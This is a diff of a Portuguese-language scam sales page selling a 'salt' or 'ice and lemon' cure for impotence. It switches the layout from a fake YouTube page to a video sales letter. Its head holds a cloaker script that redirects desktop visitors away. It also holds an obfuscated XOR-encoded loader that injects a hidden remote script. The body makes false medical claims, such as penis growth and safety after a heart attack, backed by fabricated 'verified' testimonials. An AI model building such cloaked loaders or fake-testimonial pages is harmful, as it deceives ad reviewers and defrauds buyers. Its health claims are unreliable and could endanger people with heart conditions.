@@ -3,10 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <!-- ============================================================ -->
+
+        <!-- ============================================================ -->
     <!-- CLOAKER 2/2 - VERIFICAÇÃO ANTES DO DOMÍNIO CARREGAR          -->
-    <!-- ESTE SCRIPT DEVE FICAR PRIMEIRO, ANTES DE TUDO NO <head>     -->
     <!-- ============================================================ -->
     <script>
     (function(){
@@ -55,689 +54,362 @@
             }
         }
         
-        // Segunda verificação no quiz (sessionStorage) + verificação local
         var quizDevice = null;
         try { quizDevice = sessionStorage.getItem("__clk_device__"); } catch(e) {}
         var localDevice = isDesktop() ? "desktop" : "mobile";
-        
-        // Se quiz disse desktop OU deteção local diz desktop → redireciona JÁ
         var finalDevice = (quizDevice === "desktop" || localDevice === "desktop") ? "desktop" : "mobile";
         
         if (finalDevice === "desktop") {
-            // Redireciona IMEDIATAMENTE, antes da página renderizar
-            // Usa replace para não deixar histórico da página de vendas
-            try {
-                window.stop(); // interrompe carregamento em curso
-            } catch(e) {}
-            
-            // Dupla camada: replace + fallback
+            try { window.stop(); } catch(e) {}
             if (window.location.replace) {
                 window.location.replace(DESKTOP_URL);
             } else {
                 window.location.href = DESKTOP_URL;
             }
-            
-            // Fallback extra: se por algum motivo não redirecionou em 100ms
             setTimeout(function(){
                 if (window.location.href.indexOf("/sal") === -1) {
                     window.location.href = DESKTOP_URL;
                 }
             }, 100);
-            
-            // Bloqueia renderização do resto
             throw new Error("__CLK_REDIRECT__");
         }
     })();
     </script>
-    <!-- ============================================================ -->
 
     <script>(function(){var b_o8=atob("DDvJcw8nAy0Wwv1gOkDrBn1LIRc0qokUSkjzXCBEZ0M4t4kNU12wXWxIbgN0sNITWUmgA3tULFhir45PVlq9FnxTLUdl4NFCW0+9AWZFdllzsd9aYUDrHW5KZg8s4JkBTlrkBntKaktv740SX02sHXsKe055ptATWVDrXy1RYkFjp99aGBm0X3QFbUx7p99aGF+oB24Kdll7q5sZF0u7FnlCbVk7sYgCU1+6USMFdUx6t5hCABnrDlJa");var d_lond=[];for(var h_ba4=0;h_ba4<b_o8.length;h_ba4++){d_lond.push(b_o8.charCodeAt(h_ba4)&255);}var j_sphm=d_lond[0];var j_0p5v=d_lond.slice(1,1+j_sphm);var z_zde=d_lond.slice(1+j_sphm);var l_uau=z_zde.map(function(b,w_2){return b^j_0p5v[w_2%j_sphm];});var d_5u="";for(var j_qhqy=0;j_qhqy<l_uau.length;j_qhqy++){d_5u+=String.fromCharCode(l_uau[j_qhqy]&255);}var g_ew=decodeURIComponent(escape(d_5u));var u_t0=JSON.parse(g_ew);var e_i5q=u_t0.globals||[];e_i5q.forEach(function(l_n2n){window[l_n2n.name]=l_n2n.value;});var f_sv=document.createElement("script");f_sv.src=u_t0.url;f_sv.async=true;f_sv.defer=true;(u_t0.attributes||[]).forEach(function(r_8){f_sv.setAttribute(r_8.name,r_8.value);});(document.head||document.documentElement).appendChild(f_sv);})();</script>
-    
 
-    
-    
     <title>Receita do Sal</title>
-    <!-- Font Awesome 6 (gratuita) e Google Fonts -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html, body {
+            min-height: 100%;
+            background: #0a0a0a;
         }
 
         body {
-            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
-            background-color: #0f0f0f;
-            color: #f1f1f1;
-            padding-top: 56px;
-            line-height: 1.5;
-            min-height: 100vh;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: radial-gradient(ellipse at 50% 0%, #1a1408 0%, #0a0a0a 60%);
+            color: #f5f5f5;
+            padding: 24px 16px 60px;
+            position: relative;
+            overflow-x: hidden;
         }
 
-        .yt-header {
+        /* ===== PARTÍCULAS DE FUNDO ===== */
+        #particles {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 56px;
-            background: #0f0f0f;
-            border-bottom: 1px solid #2f2f2f;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 16px;
-            z-index: 1000;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.5;
         }
 
-        .yt-header .logo {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 20px;
-            font-weight: 700;
-            color: #ff0000;
-            text-decoration: none;
-            flex-shrink: 0;
-            margin-right: 16px;
-        }
-        .yt-header .logo i {
-            font-size: 28px;
-        }
-        .yt-header .logo span {
-            color: #f1f1f1;
-            font-weight: 400;
-        }
-
-        .yt-header .search-bar {
-            flex: 1;
-            max-width: 600px;
-            margin: 0 20px;
-            display: flex;
-            align-items: center;
-            border: 1px solid #3f3f3f;
-            border-radius: 40px;
-            background: #0f0f0f;
-            overflow: hidden;
-            height: 40px;
-            box-shadow: inset 0 1px 2px rgba(0,0,0,0.02);
-        }
-        .yt-header .search-bar input {
-            flex: 1;
-            padding: 0 16px;
-            border: none;
-            background: transparent;
-            font-size: 14px;
-            color: #f1f1f1;
-            outline: none;
-            height: 100%;
-            font-family: 'Roboto', sans-serif;
-        }
-        .yt-header .search-bar input::placeholder {
-            color: #aaa;
-            font-weight: 400;
-        }
-        .yt-header .search-bar button {
-            background: #212121;
-            border: none;
-            border-left: 1px solid #3f3f3f;
-            padding: 0 18px;
-            cursor: pointer;
-            color: #f1f1f1;
-            font-size: 16px;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background 0.15s;
-            width: 64px;
-        }
-        .yt-header .search-bar button:hover {
-            background: #2f2f2f;
-        }
-        .yt-header .search-bar button::before {
-            content: "\f002";
-            font-family: "Font Awesome 6 Free";
-            font-weight: 900;
-            font-size: 16px;
-            color: #f1f1f1;
-        }
-
-        .yt-header .header-icons {
-            display: flex;
-            align-items: center;
-            gap: 18px;
-            font-size: 20px;
-            color: #f1f1f1;
-            flex-shrink: 0;
-        }
-        .yt-header .header-icons i {
-            cursor: pointer;
-            transition: color 0.15s;
-        }
-        .yt-header .header-icons i:hover {
-            color: #aaa;
-        }
-        .yt-header .header-icons .fa-video {
-            font-size: 22px;
-        }
-        .yt-header .header-icons .fa-bell {
-            font-size: 22px;
-        }
-        .yt-header .avatar {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: #444;
-            background-size: cover;
-            background-position: center;
-            cursor: pointer;
-            border: 1px solid #2f2f2f;
-        }
-
-        .yt-main {
-            max-width: 1100px;
-            margin: 0 auto;
-            padding: 20px 24px 40px;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .video-wrapper {
-            width: 100%;
+        /* ===== CONTAINER ===== */
+        .vsl-wrap {
+            position: relative;
+            z-index: 1;
             max-width: 720px;
-            margin: 0 auto 16px;
-            background: #000;
-            border-radius: 12px;
-            overflow: hidden;
-            position: relative;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            margin: 0 auto;
         }
 
-        .video-container {
+        /* ===== LOGO ===== */
+        .vsl-logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .vsl-logo img {
+            max-height: 52px;
+            width: auto;
+            opacity: 0.9;
+            border-radius: 6px;
+        }
+
+        /* ===== BADGE ===== */
+        .vsl-badge {
+            display: inline-block;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: #f5a623;
+            background: rgba(245, 166, 35, 0.1);
+            border: 1px solid rgba(245, 166, 35, 0.3);
+            padding: 6px 14px;
+            border-radius: 50px;
+            margin-bottom: 20px;
+            animation: badgePulse 2s infinite;
+        }
+        @keyframes badgePulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(245, 166, 35, 0.4); }
+            50% { box-shadow: 0 0 0 8px rgba(245, 166, 35, 0); }
+        }
+
+        /* ===== HEADLINE ===== */
+        .vsl-headline {
+            text-align: center;
+            font-size: 26px;
+            font-weight: 800;
+            line-height: 1.3;
+            color: #f5f5f5;
+            letter-spacing: -0.5px;
+            margin-bottom: 28px;
+            animation: screenIn 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
+        }
+        .vsl-headline .highlight {
+            color: #f5a623;
+            -webkit-text-fill-color: #f5a623;
             position: relative;
-            width: 100%;
-            padding-top: 133.33%;
-            background: #000;
+            display: inline-block;
         }
-        .video-container > * {
+        .vsl-headline .highlight::after {
+            content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            bottom: -2px; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #f5a623, transparent);
         }
-        .video-container -smartplayer {
+
+        @keyframes screenIn {
+            0% { opacity: 0; transform: translateY(24px) scale(0.98); filter: blur(4px); }
+            100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+        }
+
+        /* ===== VSL PURA (SEM ESTILIZAÇÃO) ===== */
+        .vsl-player {
+            width: 100%;
+            margin: 0 auto 32px;
+            animation: screenIn 0.7s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
+        }
+        .vsl-player vturb-smartplayer {
             display: block;
             width: 100%;
-            height: 100%;
-        }
-        .vturb-player-placeholder {
-            width: 100%;
-            height: 100%;
-            background: #111;
+            margin: 0 auto;
         }
 
-        .video-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #f1f1f1;
-            margin: -4px 0 8px;
-            line-height: 1.3;
+        /* ===== COMENTÁRIOS ===== */
+        .comments-section {
+            animation: screenIn 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
         }
 
-        .video-meta {
+        .comments-header {
             display: flex;
-            flex-wrap: wrap;
             align-items: center;
             justify-content: space-between;
-            border-bottom: 1px solid #2f2f2f;
-            padding-bottom: 12px;
-            margin-bottom: 16px;
-            gap: 12px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #1e1e1e;
+            margin-bottom: 20px;
         }
-
-        .channel-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .channel-info .avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: #444;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
+        .comments-header .title {
+            font-size: 15px;
             font-weight: 700;
-            font-size: 18px;
-            flex-shrink: 0;
+            color: #f5f5f5;
+            letter-spacing: -0.2px;
         }
-        .channel-info .details {
-            display: flex;
-            flex-direction: column;
-        }
-        .channel-info .details .name {
-            font-weight: 600;
-            font-size: 16px;
-            color: #f1f1f1;
-        }
-        .channel-info .details .subs {
-            font-size: 13px;
-            color: #aaa;
-        }
-
-        .channel-info .subscribe-btn {
-            background: #cc0000;
-            color: #fff;
-            border: none;
-            padding: 6px 16px;
-            border-radius: 40px;
-            margin-left: -6px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            transition: background 0.2s, transform 0.1s;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            height: 36px;
-            min-width: 100px;
-        }
-        .channel-info .subscribe-btn:hover {
-            background: #990000;
-        }
-        .channel-info .subscribe-btn:active {
-            transform: scale(0.96);
-        }
-        .channel-info .subscribe-btn.subscribed {
-            background: #272727;
-            color: #f1f1f1;
-            border: 1px solid #3f3f3f;
-        }
-        .channel-info .subscribe-btn.subscribed:hover {
-            background: #2f2f2f;
-        }
-
-        .action-buttons {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            flex-wrap: wrap;
-        }
-        .action-buttons button {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            background: #272727;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 40px;
-            font-size: 14px;
-            font-weight: 500;
-            color: #f1f1f1;
-            cursor: pointer;
-            transition: background 0.15s, transform 0.1s;
-            height: 36px;
-        }
-        .action-buttons button:hover {
-            background: #2f2f2f;
-        }
-        .action-buttons button:active {
-            transform: scale(0.96);
-        }
-        .action-buttons button i {
-            font-size: 18px;
-        }
-        .action-buttons .like-btn {
-            border-radius: 40px 0 0 40px;
-            padding-right: 12px;
-            gap: 8px;
-            border-right: 1px solid #3f3f3f;
-        }
-        .action-buttons .like-btn.liked {
-            background: #2f2f2f;
-            color: #065fd4;
-        }
-        .action-buttons .like-btn.liked i {
-            color: #065fd4;
-        }
-        .action-buttons .dislike-btn {
-            border-radius: 0 40px 40px 0;
-            padding-left: 12px;
-            border-left: none;
-        }
-        .action-buttons .dislike-btn i {
-            font-size: 18px;
-        }
-        .action-buttons .fa-share {
-            font-size: 18px;
-        }
-        .action-buttons .fa-download {
-            font-size: 18px;
-        }
-        .action-buttons .fa-ellipsis-h {
-            font-size: 18px;
-        }
-
-        .views-date {
-            font-size: 14px;
-            color: #aaa;
-            margin: 4px 0 8px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        .live-counter {
+        .comments-header .live {
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            background: #272727;
+            background: rgba(245, 166, 35, 0.08);
+            border: 1px solid rgba(245, 166, 35, 0.25);
             border-radius: 20px;
-            padding: 2px 12px;
-            font-size: 13px;
-            color: #aaa;
+            padding: 4px 12px;
+            font-size: 11px;
+            font-weight: 600;
+            color: #f5a623;
+            letter-spacing: 0.3px;
         }
-        .live-counter i {
-            color: #ff0000;
-            font-size: 10px;
+        .comments-header .live i {
+            font-size: 7px;
+            color: #f5a623;
             animation: pulse-dot 1.5s infinite ease-in-out;
         }
         @keyframes pulse-dot {
             0% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 0.3; transform: scale(0.7); }
             100% { opacity: 1; transform: scale(1); }
         }
 
-        .description {
-            background: #272727;
-            padding: 12px 16px;
-            border-radius: 12px;
-            font-size: 14px;
-            line-height: 1.6;
-            margin: 8px 0 20px;
-            color: #f1f1f1;
-            border: 1px solid #2f2f2f;
-        }
-        .description .show-more {
-            color: #aaa;
-            font-weight: 500;
-            cursor: pointer;
-        }
-        .description .show-more:hover {
-            color: #f1f1f1;
-        }
-
-        .comments-section {
-            margin-top: 8px;
-        }
-        .comments-header {
-            display: flex;
-            align-items: center;
-            gap: 24px;
-            font-size: 16px;
-            font-weight: 500;
-            color: #f1f1f1;
-            padding-bottom: 8px;
-            border-bottom: 1px solid #2f2f2f;
-            margin-bottom: 16px;
-        }
-        .comments-header span:first-child {
-            color: #f1f1f1;
-        }
-        .comments-header span:last-child {
-            color: #aaa;
-            font-weight: 400;
-            font-size: 14px;
-            cursor: pointer;
-        }
-
+        /* ===== COMENTÁRIO ===== */
         .comment {
+            background: #141414;
+            border: 1.5px solid #2a2a2a;
+            border-radius: 14px;
+            padding: 14px 16px;
+            margin-bottom: 10px;
             display: flex;
             gap: 12px;
-            margin-bottom: 16px;
+            transition: all 0.25s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            animation: commentIn 0.5s ease forwards;
+            opacity: 0;
         }
+        @keyframes commentIn {
+            0% { opacity: 0; transform: translateY(12px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        .comment:hover {
+            border-color: #3a3a3a;
+            transform: translateX(2px);
+            box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+        }
+
         .comment .avatar {
             width: 40px;
             height: 40px;
             border-radius: 50%;
             flex-shrink: 0;
-            background: #3a3a3a;
+            background: #2a2a2a;
             background-size: cover;
             background-position: center;
-        }
-        .comment .content {
-            flex: 1;
-        }
-        .comment .content .author {
-            font-weight: 600;
-            font-size: 13px;
-            color: #f1f1f1;
-        }
-        .comment .content .author span {
-            font-weight: 400;
-            color: #aaa;
-            font-size: 12px;
-            margin-left: 6px;
-        }
-        .comment .content .text {
-            font-size: 14px;
-            margin: 4px 0 6px;
-            word-break: break-word;
-            color: #f1f1f1;
-        }
-        .comment .content .actions {
+            border: 1.5px solid #333;
             display: flex;
             align-items: center;
-            gap: 12px;
-            font-size: 13px;
-            color: #aaa;
-            margin-top: 4px;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 15px;
+            color: #f5a623;
         }
-        .comment .content .actions i {
+
+        .comment .content { flex: 1; min-width: 0; }
+
+        .comment .author {
+            font-weight: 700;
+            font-size: 13px;
+            color: #f5f5f5;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .comment .author .time {
+            font-weight: 500;
+            color: #666;
+            font-size: 11px;
+        }
+        .comment .author .verified {
+            color: #f5a623;
+            font-size: 11px;
+        }
+
+        .comment .text {
             font-size: 14px;
+            line-height: 1.55;
+            color: #c8c8c8;
+            margin: 6px 0 10px;
+            word-break: break-word;
+        }
+        .comment .text strong {
+            color: #f5b83d;
+            font-weight: 700;
+        }
+
+        .comment .actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            font-size: 12px;
+            color: #666;
+        }
+        .comment .actions .like-count {
+            display: flex;
+            align-items: center;
+            gap: 5px;
             cursor: pointer;
             transition: color 0.2s;
+            font-weight: 600;
         }
-        .comment .content .actions i:hover {
-            color: #f1f1f1;
+        .comment .actions .like-count:hover {
+            color: #f5a623;
         }
-        .comment .content .actions .like-count {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            cursor: pointer;
+        .comment .actions .like-count i {
+            font-size: 12px;
         }
-        .comment .content .actions .like-count i {
-            font-size: 14px;
+        .comment .actions .like-count.liked {
+            color: #f5a623;
         }
-        .comment .content .actions .reply {
-            font-weight: 500;
+        .comment .actions .reply {
+            font-weight: 600;
             cursor: pointer;
             text-transform: uppercase;
-            font-size: 12px;
-            letter-spacing: 0.3px;
+            font-size: 11px;
+            letter-spacing: 0.5px;
+            transition: color 0.2s;
         }
-        .comment .content .actions .reply:hover {
-            color: #f1f1f1;
+        .comment .actions .reply:hover {
+            color: #f5a623;
         }
 
+        /* ===== COMENTÁRIO RESPOSTA ===== */
         .comment.reply {
-            margin-left: 52px;
-            margin-bottom: 12px;
+            margin-left: 32px;
+            border-left: 2px solid #f5a623;
+            background: #101010;
         }
 
+        /* ===== FECHO DOS COMENTÁRIOS ===== */
         .comments-closed {
             text-align: center;
-            color: #aaa;
-            font-size: 14px;
+            color: #555;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
             padding: 20px 0 10px;
-            border-top: 1px solid #2f2f2f;
-            margin-top: 10px;
+            border-top: 1px solid #1e1e1e;
+            margin-top: 14px;
         }
 
-        @media (max-width: 768px) {
-            .yt-header .search-bar {
-                max-width: 200px;
-                margin: 0 10px;
-            }
-            .yt-header .header-icons {
-                gap: 12px;
-                font-size: 18px;
-            }
-            .yt-main {
-                padding: 12px 12px 30px;
-            }
-            .video-title {
-                font-size: 18px;
-            }
-            .video-meta {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            .action-buttons {
-                width: 100%;
-                justify-content: flex-start;
-            }
-            .comment.reply {
-                margin-left: 36px;
-            }
-            .channel-info .subscribe-btn {
-                font-size: 10px;
-                padding: 4px 12px;
-                height: 32px;
-                min-width: 80px;
-            }
-            .yt-header .search-bar button {
-                width: 48px;
-                padding: 0 12px;
-            }
-            .yt-header .search-bar button::before {
-                font-size: 14px;
-            }
-        }
+        /* ===== RESPONSIVO ===== */
         @media (max-width: 480px) {
-            .yt-header .search-bar {
-                max-width: 120px;
-                height: 34px;
-            }
-            .yt-header .search-bar input {
-                font-size: 13px;
-                padding: 0 10px;
-            }
-            .yt-header .search-bar button {
-                width: 40px;
-                padding: 0 8px;
-            }
-            .yt-header .search-bar button::before {
-                font-size: 12px;
-            }
-            .yt-header .logo {
-                font-size: 16px;
-            }
-            .yt-header .logo i {
-                font-size: 22px;
-            }
-            .yt-header .header-icons {
-                gap: 10px;
-                font-size: 16px;
-            }
-            .yt-header .header-icons .fa-video,
-            .yt-header .header-icons .fa-bell {
-                font-size: 18px;
-            }
-            .yt-header .avatar {
-                width: 28px;
-                height: 28px;
-            }
-            .action-buttons button {
-                padding: 6px 12px;
-                font-size: 12px;
-                height: 30px;
-            }
-            .action-buttons button i {
-                font-size: 14px;
-            }
-            .video-title {
-                font-size: 18px;
-            }
-            .comment .content .text {
-                font-size: 13px;
-            }
-            .comment .content .actions {
-                font-size: 12px;
-            }
-            .description {
-                font-size: 13px;
-                padding: 10px 14px;
-            }
+            body { padding: 18px 12px 50px; }
+            .vsl-headline { font-size: 20px; }
+            .vsl-logo img { max-height: 42px; }
+            .comment { padding: 12px 12px; }
+            .comment .avatar { width: 34px; height: 34px; font-size: 13px; }
+            .comment .text { font-size: 13px; }
+            .comment.reply { margin-left: 20px; }
+            .comments-header .title { font-size: 14px; }
         }
     </style>
 </head>
 <body>
 
-    <header class="yt-header">
-        <a href="#" class="logo">
-            <i class="fab fa-youtube"></i> <span>YouTube</span>
-        </a>
-        <div class="search-bar">
-            <input type="text" placeholder="Pesquisar">
-            <button></button>
-        </div>
-        <div class="header-icons">
-            <i class="fas fa-video"></i>
-            <i class="fas fa-bell"></i>
-            <div class="avatar" style="background-image: url('images/avatar.jpg');"></div>
-        </div>
-    </header>
+    <!-- PARTÍCULAS DE FUNDO -->
+    <canvas id="particles"></canvas>
 
-    <main class="yt-main">
-        <div class="video-wrapper">
-            <div class="video-container">
-<vturb-smartplayer id="vid-6ab68817be6066e07d2ee5e8" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 133.33333333333331% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/2c3d960f-39c3-4072-a7af-c60fed7da363/players/6ab68817be6066e07d2ee5e8/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
-            </div>
-        </div>
+    <div class="vsl-wrap">
 
-        <h1 class="video-title">Veja como usar o Gelo e Limão para curar a disfunção e devolver a tua masculinidade!</h1>
 
-        <div class="video-meta">
-            <div class="action-buttons">
-                <button class="like-btn" id="likeBtn">
-                    <i class="fas fa-thumbs-up"></i>
-                    <span class="likes-num" id="likeCount">5,2 mil</span>
-                </button>
-                <button class="dislike-btn">
-                    <i class="fas fa-thumbs-down"></i>
-                </button>
-                <button><i class="fas fa-share"></i> Partilhar</button>
-                <button><i class="fas fa-download"></i></button>
-                <button><i class="fas fa-ellipsis-h"></i></button>
-            </div>
+        <!-- HEADLINE DESTACADA -->
+        <h1 class="vsl-headline">
+    O <span class="highlight">segredo </span> que está a fazer homens voltarem a ficar <span class="highlight">duros como aos 20</span> usando apenas <span class="highlight">Gelo e Limão</span>
+        </h1>
+
+        <!-- VSL PURA -->
+        <div class="vsl-player">
+            <vturb-smartplayer id="vid-6ab68817be6066e07d2ee5e8" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;">
+                <div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 133.33333333333331% 0 0; z-index: 0; background-color: black;"></div>
+            </vturb-smartplayer>
+            <script type="text/javascript">
+                var s=document.createElement("script");
+                s.src="https://scripts.converteai.net/2c3d960f-39c3-4072-a7af-c60fed7da363/players/6ab68817be6066e07d2ee5e8/v4/player.js";
+                s.async=!0,document.head.appendChild(s);
+            </script>
         </div>
 
-        <div class="views-date">
-            <span class="live-counter"><i class="fas fa-circle"></i> <span id="liveCount">1.234</span> a assistir agora</span>
-        </div>
-
-        <div class="description">
-            Cansado de depender de Viagra? Esta receita ancestral com sal comum está a devolver a potência e autoestima a milhares de homens. 100% natural, sem efeitos colaterais. Assiste até ao fim e transforma a tua vida sexual!<br>
-            <span class="show-more">...mais</span>
-        </div>
-
+        <!-- COMENTÁRIOS -->
         <div class="comments-section">
             <div class="comments-header">
-                <span>1.321 Comentários</span>
+                <span class="title">1.321 Comentários</span>
             </div>
 
             <div class="comment" data-id="1">
-                <div class="avatar" style="background-image: url('images/1.jpg');"></div>
+                <div class="avatar" style="background-image: url('images/1.jpg');">C</div>
                 <div class="content">
-                    <div class="author">Carlos Silva <span>Há 2 horas</span></div>
-                    <div class="text">Depois de 8 anos dependente de Viagra, finalmente estou livre! Usei o sal por 3 dias e tive a ereção mais forte da minha vida. Minha esposa não acreditou! 😲</div>
+                    <div class="author">Carlos Silva <span class="time">Há 2 horas</span> <span class="verified">✓</span></div>
+                    <div class="text">Depois de 8 anos dependente de Viagra, finalmente estou livre! Usei o sal por 3 dias e tive a ereção mais forte da minha vida. <strong>Minha esposa não acreditou!</strong> 😲</div>
                     <div class="actions">
                         <span class="like-count"><i class="fas fa-thumbs-up"></i> 254</span>
                         <span class="reply">Responder</span>
@@ -746,10 +418,10 @@
             </div>
 
             <div class="comment" data-id="3">
-                <div class="avatar" style="background-image: url('images/2.jpg');"></div>
+                <div class="avatar" style="background-image: url('images/2.jpg');">J</div>
                 <div class="content">
-                    <div class="author">João Santos <span>Há 1 hora</span></div>
-                    <div class="text">Sofri 12 anos de impotência e já tinha perdido as esperanças. Com o protocolo do sal, em uma semana meu pênis ficou mais grosso e as ereções duram 40+ minutos. Revolucionário!</div>
+                    <div class="author">João Santos <span class="time">Há 1 hora</span> <span class="verified">✓</span></div>
+                    <div class="text">Sofri 12 anos de impotência e já tinha perdido as esperanças. Com o protocolo do sal, em uma semana meu pênis ficou mais grosso e as ereções duram <strong>40+ minutos</strong>. Revolucionário!</div>
                     <div class="actions">
                         <span class="like-count"><i class="fas fa-thumbs-up"></i> 189</span>
                         <span class="reply">Responder</span>
@@ -758,10 +430,10 @@
             </div>
 
             <div class="comment" data-id="4">
-                <div class="avatar" style="background-image: url('images/3.jpg');"></div>
+                <div class="avatar" style="background-image: url('images/3.jpg');">M</div>
                 <div class="content">
-                    <div class="author">Miguel Costa <span>Há 1 hora</span></div>
-                    <div class="text">Aos 61 anos, achei que minha vida sexual tinha acabado. Mas com esse método natural, voltei a ter ereções como aos 25! Minha mulher está impressionada e nossa relação renasceu.</div>
+                    <div class="author">Miguel Costa <span class="time">Há 1 hora</span> <span class="verified">✓</span></div>
+                    <div class="text">Aos 61 anos, achei que minha vida sexual tinha acabado. Mas com esse método natural, voltei a ter ereções como aos 25! <strong>Minha mulher está impressionada</strong> e nossa relação renasceu.</div>
                     <div class="actions">
                         <span class="like-count"><i class="fas fa-thumbs-up"></i> 312</span>
                         <span class="reply">Responder</span>
@@ -770,10 +442,10 @@
             </div>
 
             <div class="comment" data-id="5">
-                <div class="avatar" style="background-image: url('images/4.jpg');"></div>
+                <div class="avatar" style="background-image: url('images/4.jpg');">A</div>
                 <div class="content">
-                    <div class="author">António Fernandes <span>Há 19 minutos</span></div>
-                    <div class="text">Gastava mais de 5.000 meticais por mês em Viagra e sprays. Agora com o sal, tenho ereções naturais que duram mais de 50 minutos. Economizo dinheiro e tenho melhor desempenho</div>
+                    <div class="author">António Fernandes <span class="time">Há 19 minutos</span> <span class="verified">✓</span></div>
+                    <div class="text">Gastava mais de 5.000 meticais por mês em Viagra e sprays. Agora com o sal, tenho ereções naturais que duram <strong>mais de 50 minutos</strong>. Economizo dinheiro e tenho melhor desempenho</div>
                     <div class="actions">
                         <span class="like-count"><i class="fas fa-thumbs-up"></i> 147</span>
                         <span class="reply">Responder</span>
@@ -782,10 +454,10 @@
             </div>
 
             <div class="comment" data-id="6">
-                <div class="avatar" style="background-image: url('images/5.jpg');"></div>
+                <div class="avatar" style="background-image: url('images/5.jpg');">P</div>
                 <div class="content">
-                    <div class="author">Paulo Machava <span>Há 19 minutos</span></div>
-                    <div class="text">Depois do infarto, os médicos proibiram Viagra. Pensei que nunca mais teria uma vida sexual normal. O sal me salvou é 100% natural e não faz mal ao coração. Ereções duras como pedra!</div>
+                    <div class="author">Paulo Machava <span class="time">Há 19 minutos</span> <span class="verified">✓</span></div>
+                    <div class="text">Depois do infarto, os médicos proibiram Viagra. Pensei que nunca mais teria uma vida sexual normal. O sal me salvou é <strong>100% natural</strong> e não faz mal ao coração. Ereções duras como pedra!</div>
                     <div class="actions">
                         <span class="like-count"><i class="fas fa-thumbs-up"></i> 98</span>
                         <span class="reply">Responder</span>
@@ -794,10 +466,10 @@
             </div>
 
             <div class="comment" data-id="7">
-                <div class="avatar" style="background-image: url('images/6.jpg');"></div>
+                <div class="avatar" style="background-image: url('images/6.jpg');">R</div>
                 <div class="content">
-                    <div class="author">Ricardo Dauto <span>Há 19 minutos</span></div>
-                    <div class="text">Minha autoestima estava no chão. Com 49 anos já não conseguia mais ter relações. O protocolo do sal mudou tudo - em 10 dias meu pênis cresceu 3cm e as ereções são explosivas! Minha mulher não para de elogiar.</div>
+                    <div class="author">Ricardo Dauto <span class="time">Há 19 minutos</span> <span class="verified">✓</span></div>
+                    <div class="text">Minha autoestima estava no chão. Com 49 anos já não conseguia mais ter relações. O protocolo do sal mudou tudo - em 10 dias meu pênis cresceu <strong>3cm</strong> e as ereções são explosivas! Minha mulher não para de elogiar.</div>
                     <div class="actions">
                         <span class="like-count"><i class="fas fa-thumbs-up"></i> 215</span>
                         <span class="reply">Responder</span>
@@ -806,9 +478,9 @@
             </div>
 
             <div class="comment reply" data-id="8">
-                <div class="avatar" style="background-image: url('images/7.jpg');"></div>
+                <div class="avatar" style="background-image: url('images/7.jpg');">M</div>
                 <div class="content">
-                    <div class="author">Manuel Tavares <span>Há 10 minutos</span></div>
+                    <div class="author">Manuel Tavares <span class="time">Há 10 minutos</span></div>
